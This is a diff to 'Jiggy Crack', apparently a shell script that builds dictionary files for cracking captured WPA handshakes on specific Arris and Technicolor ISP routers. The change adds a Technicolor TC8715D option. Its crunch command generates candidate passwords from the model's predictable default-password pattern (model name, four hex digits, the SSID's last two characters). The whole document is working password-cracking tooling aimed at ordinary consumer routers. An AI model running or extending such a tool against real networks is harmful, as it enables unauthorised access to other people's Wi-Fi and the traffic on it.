@@ -8,8 +8,8 @@
 #	handshake in order to use aircrack, or whichever tool you favor, to
 #	verify which of the passwords in the dictionary is the correct one.
 
-jigver="v0.3.5"
-echo "Jiggy Crack" $jigver "by Jeremy Drahos (jeremy@thedrahos.net)"
+jigver="v0.3.6"
+echo "Jiggy Crack" $jigver "by Jeremy Drahos (jcrack@thedrahos.net)"
 echo ""
 echo "Select the router model:"
 echo "1. Arris DG860A"
@@ -22,6 +22,7 @@ echo "7. Arris TG1672G"
 echo "8. Technicolor TC8717T"
 echo "9. Arris TG862G"
 echo "10. Arris DG1670A"
+echo "11. Technicolor TC8715D"
 echo "'q' to quit"
 echo ""
 read -p "Select the target router from the list: " router_option
@@ -157,6 +158,18 @@ dg1670 () {
 	exit 0
 }
 
+tc8715d () {
+	rmodel="TC8715D"
+	rsmall="tc8715"
+	echo "What are the last 2 characters of the SSID for the $rmodel?"
+	read router_last2
+	echo "Generating dictionary file for a $rmodel with a SSID ending in $router_last2"
+	crunch 13 13 0123456789ABCDEF -t TC8715D@@@@$router_last2 > $rsmall.$router_last2
+	dictfile=`ls -sh $rsmall.$router_last2`
+	echo "Dictionary created: $dictfile"
+	exit 0
+}
+
 case "$router_option" in
 	1 ) dg860
 	;;
@@ -177,6 +190,8 @@ case "$router_option" in
 	9 ) tg862
 	;;
 	10 ) dg1670
+	;;
+	11 ) tc8715d
 	;;
 	q ) q
 	;;
